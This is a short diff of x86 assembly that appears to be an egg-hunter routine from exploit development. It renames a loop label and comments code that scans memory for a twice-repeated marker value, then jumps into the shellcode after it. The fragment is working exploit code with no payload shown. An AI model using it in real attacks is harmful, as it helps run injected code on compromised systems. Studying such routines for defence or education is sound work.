@@ -13,12 +13,11 @@ lp1:
 	inc eax
 	xor ebx,ebx
 	mov cl,2
-lp3:
+lp2:
 	cmp dword [eax+ebx],0xddccbbaa
 	jne lp1
-	add ebx,4
-	dec cl
-	jnz lp3
-lp4:
-	lea eax,[eax+8]
+	add ebx,4	;the egg must be found twice so i check eax and eax+4
+	dec cl		;this is a counter to track how many times the egg has been found
+	jnz lp2
+	lea eax,[eax+8]	;if the egg has been found then jmp into the shellcode
 	jmp eax
